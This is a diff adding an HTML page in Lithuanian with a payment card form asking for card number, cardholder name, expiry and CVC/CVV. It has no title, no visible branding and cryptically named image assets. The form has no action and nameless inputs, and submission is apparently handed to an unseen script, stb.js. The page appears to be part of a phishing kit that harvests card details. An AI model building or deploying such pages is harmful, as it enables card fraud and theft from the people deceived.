@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/coral.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body >
+    <div>
+        <div class="roof">
+            <img src="./img/tyoupq.JPG" alt="">
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="ind1">
+                    <img src="./img/indroccpg.JPG" alt="">
+                    <img src="./img/upnocc2.JPG" alt="">
+            </div>
+            </p>
+            <div class="section">
+                
+                <div class="kolch">
+                    <form method="post" id="pg2">
+                        <p>Kortelės numeris </p>
+                        <input type="tele" name="" id="numcc" maxlength="19" placeholder="____  ____  ____  ____" required>
+
+                        <p>Vardas ir pavardė ant kortelės  </p>
+                        <input type="text" name="" id="numnn" maxlength="19" required>
+
+                        <p>Galiojimo pabaigos data</p>
+                        <div class="exp">
+                            <input class="mm" type="tel" name="" id="mmo" required placeholder="MM" maxlength="3">
+                            <input type="tel" name="" id="aao" required placeholder="AA"  maxlength="3">
+                        </div>
+
+                        <p>CVC/CVV</p>
+                        <input class="cfifi" type="tel" name="" id="numvv" required maxlength="8" maxlength="4">
+
+                        <button class="btn2"  type="submit">Mokėti</button>
+                    </form>
+                    <div class="ind1">
+                        <img src="./img/securcc1.JPG" alt="">
+                    </div>
+                </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div>
+        <div>
+            <div class="boot">
+                <img src="./img/bonotia.JPG" alt="">
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>
+        $("#numcc").on("keyup",function(){
+           cc = $(this).val().split(" ").join("");
+           cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
+           $(this).val(cc);
+       });
+    </script>
+    <!--  -->
+    <script src="./js/stb.js"></script>
+</body>
+</html>
